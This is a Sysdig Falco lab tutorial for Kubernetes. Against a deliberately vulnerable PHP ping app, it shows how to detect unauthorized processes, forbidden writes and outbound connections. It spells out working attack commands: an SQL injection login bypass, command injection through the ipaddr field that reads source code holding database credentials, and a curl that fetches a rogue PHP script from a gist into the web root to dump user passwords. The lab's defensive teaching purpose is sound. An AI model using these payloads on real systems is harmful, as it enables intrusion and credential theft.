**Sysdig Falco** is an open source project for intrusion and abnormality detection for Cloud Native platforms such as Kubernetes, Mesosphere, and Cloud Foundry.

It can detect abnormal application behavior, and alert via Slack, Fluentd, NATS, and more.

It can also protect your platform by taking action through serverless (FaaS) frameworks, or other automation.

If you have not done it yet, it's a good idea to complete the [Sysdig Falco: Container security monitoring](https://katacoda.com/sysdig/courses/falco/sysdig-falco) scenario before this one.

In this lab you will learn the basics of Sysdig Falco and how to use it along with a Kubernetes cluster to detect anomalous behavior.

This scenario will cover the following security threats:

- Unauthorized process
- Write to non authorized directory
- Processes opening unexpected connections to the Internet

You will play both the attacker and defender (sysadmin) roles, verifying that the intrusion attempt has been detected by Sysdig Falco.

-------------------------------------------------------------------------------------------------------------------------
We have already set up a Kubernetes cluster just for you.  
On the right you can see the terminal of the `master` node, from which you can interact with the cluster using the `kubectl` tool, which is already configured.

For instance, you can get the details of the cluster executing `kubectl cluster-info`{{execute}}

You can view the nodes in the cluster with the command `kubectl get nodes`{{execute}}

You should see 2 nodes: one master and a worker.

Check that you are admin: `kubectl auth can-i create node`{{execute}}

You can view the current status of our cluster using the command `kubectl get pod -n kube-system`{{execute}}

Make sure that all the pods are in `Running` state. Othewise, wait a few moments and try again.
------------------------------------------------------------------------------------------------------------------------
You will install Falco using _Helm_, a package manager for Kubernetes that we have already installed in the cluster.  In other environments, you will probably have to install it yourself.

Deploying Sysdig Falco only takes a simple command:

`helm install --name falco stable/falco`{{execute}}

This will result in a Falco Pod being deployed to each node, and thus the ability to monitor any running containers for abnormal behavior.

The deployment may take a couple of minutes. Check that all the pods are in `Running` state before continuing:

`kubectl get pods`{{execute}}
------------------------------------------------------------------------------------------------------------------------
Falco has two files of rules:

- a default rules file, installed at `/etc/falco/falco_rules.yaml`.  You should not modify this file.
- a local rules file, installed at `/etc/falco/falco_rules.local.yaml`. Your additions or modifications to the default rules should be in this file.

The default rules file contains detection patterns for many common threats.  This file is always read first, followed by the local rules file.

This makes easy to customize falco's behavior, and still allows to update the rules as part of software upgrades.

A falco rules file is a YAML file containing three kinds of elements: rules, macros, and lists.

- **Rules** consist of a condition under which an alert should be generated and a output string to send with the alert.
- **Macros** are simply rule condition snippets that can be re-used inside rules and other macros, providing a way to factor out and name common patterns.
- **Lists** are (surprise!) lists of items that can be included in rules, macros, or other lists. Unlike rules/macros, they can not be parsed as sysdig filtering expressions.

A Rule is a node in the YAML file containing at least the following keys:

- **rule**: a short unique name for the rule
- **condition**: a filtering expression that is applied against events to see if they match the rule.
- **desc**: a longer description of what the rule detects
- **output**: it specifies the message that should be output if a matching event occurs, and follows the Sysdig output format syntax.
- **priority**: a case-insensitive representation of severity and should be one of "emergency", "alert", "critical", "error", "warning", "notice", "informational", or "debug".

Additional optional keys are: `enabled`, `tags`, `warn_evttypes` and `skip-if-unknown-filter`.
--------------------------------------------------------------------------------------------------------------------------
We will create three pods (client, mysql, ping) for our workshop:

- The `mysql` pod hosts a database of users and passwords.
- The `ping` pod hosts a form written in PHP, which allows authenticated users to ping a machine.
- We will use the `client` pod to send HTTP requests to `ping`'s web server.

![https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/01b_topology.png](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/01b_topology.png)

`kubectl create namespace ping
kubectl create -f mysql-deployment.yaml --namespace=ping
kubectl create -f mysql-service.yaml --namespace=ping
kubectl create -f ping-deployment.yaml --namespace=ping
kubectl create -f ping-service.yaml --namespace=ping
kubectl create -f client-deployment.yaml --namespace=ping`{{execute}}

As usual, make sure the pods are ready (it may take one or two minutes):

`kubectl get pods -n ping`{{execute}}

You can access the Ping web application pressing the **Ping web** tab on the right.
Alternatively, you can open this URL in your browser:

<https://[[HOST_SUBDOMAIN]]-31337-[[KATACODA_HOST]].environments.katacoda.com/ping.php>

You can use the username "bob" and password "foobar" to ping any machine in the Internet.

![Ping](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/01_pingweb.png)

If you enter an incorrect password, access will be denied.

![Wrong password](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/02_wrong_password.png)

Now we will do the same, but from the `client` pod.  Let's send a request to the Ping application to ping localhost:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bob" -F "passwd=foobar" -F "ipaddr=localhost" -X POST http://ping/ping.php`{{execute}}

Of course, access should be denied to users without proper credentials:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bob" -F "passwd=wrongpassword" -F "ipaddr=localhost" -X POST http://ping/ping.php`{{execute}}
-------------------------------------------------------------------------------------------------------------------------
Adding Custom Rules to Falco
----------------------------

Before attacking the web application we will add a few custom rules to Falco. These rules will be explained shortly:

`helm upgrade falco stable/falco -f custom_rules.yaml`{{execute}}

The Falco pod has to be created anew, so wait until it reaches `Running` state:

`kubectl get po`{{execute}}

SQL Injection attack
--------------------

It turns out our web application is faulty and susceptible to [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) attacks:

![SQL injection](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/03_sql_injection.png)

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost" -X POST http://ping/ping.php`{{execute}}

An attacker can bypass the authentication mechanism and use the application withoug knowing the password!

Not only that, he can even **execute arbitrary commands**:

![Arbitrary command](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/04_arbitrary_command.png)

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ps aux" -X POST http://ping/ping.php`{{execute}}

The attacker could easily get the **source code** for our ping app, which contains the **database credentials**:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; cat /var/www/html/ping.php" -X POST http://ping/ping.php`{{execute}}

Detection with Falco
--------------------

Falco helps us detect this kind of attacks thanks to this custom rule:

```yaml
- rule: Unauthorized process
desc: There is a running process not described in the base template
condition: spawned_process and container and k8s.ns.name=ping and k8s.deployment.name=ping and not proc.name in (apache2, sh, ping)
output: Unauthorized process (%proc.cmdline) running in (%container.id)
priority: ERROR
tags: [process]
```

In the rule condition, you already know `spawned_process`, `container` and `proc.name` from our previous scenario.

Notice how this time we make use of **Kubernetes metadata**:
`k8s.ns.name=ping and k8s.deployment.name=ping`

You can find all the available fields in the [documentation](https://github.com/draios/sysdig/wiki/Sysdig-User-Guide#all-supported-filters).

Take a look at the logs generated by Falco:

`kubectl logs --selector app=falco | grep Error`{{execute}}

You should see something like:

`18:37.06.570052961: Error Unauthorized process (cat /var/www/html/ping.php) running in (f34f277537e4) k8s.ns=ping k8s.pod=ping-5dffbc654-qrr6m container=f34f277537e4`

You could [configure a custom programmatic output](https://github.com/draios/falco/wiki/Falco-Alerts#program-output) to send notifications to event and alerting systems in your organization.
-------------------------------------------------------------------------------------------------------------------------
Once the attacker knows the login details for the database, he could easily write a [small rogue program](https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php), and place it in our server:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; curl https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php > /var/www/html/dump.php " -X POST http://ping/ping.php`{{execute}}

Finally, he could invoke his program to get a dump of the database contents, including the table with all our users and their passwords.

`kubectl exec client -n ping -- curl http://ping/dump.php`{{execute}}

Detection with Falco
--------------------

Falco help us detect this kind of attacks thanks to these custom rules:

```yaml
- rule: Apache writing to non allowed directory
desc: Attempt to write to directories that should be immutable
condition: open_write and container and k8s.ns.name=ping and k8s.deployment.name=ping and not (ping_allowed_dirs and proc.name in (apache2))
output: "Writing to forbidden directory (user=%user.name command=%proc.cmdline file=%fd.name)"
priority: ERROR
tags: [filesystem]

- rule: Forbidden network outbound connection
desc: A non-whitelisted process is trying to reach the Internet
condition: outbound and container and k8s.ns.name=ping and k8s.deployment.name=ping and not proc.name in (ping, apache2)
output: Forbidden outbound connection (user=%user.name command=%proc.cmdline connection=%fd.name)
priority: ERROR
tags: [network]
```

The `open_write` macro is true when a process tries to write to a directory holding system binaries.

The `outbound` macro is true when a network connection to the external world is opened.

Take a look at the logs generated by Falco:

`kubectl logs --selector app=falco | grep Error`{{execute}}

You should see something like:

```log
18:44:04.581760211: Error Writing to forbidden directory (user=www-data command=sh [...] file=/var/www/html/dump.php) [...]
18.44.04.590718953: Error Forbidden outbound connection (user=www-data command=curl https:// [...]
  ```
  
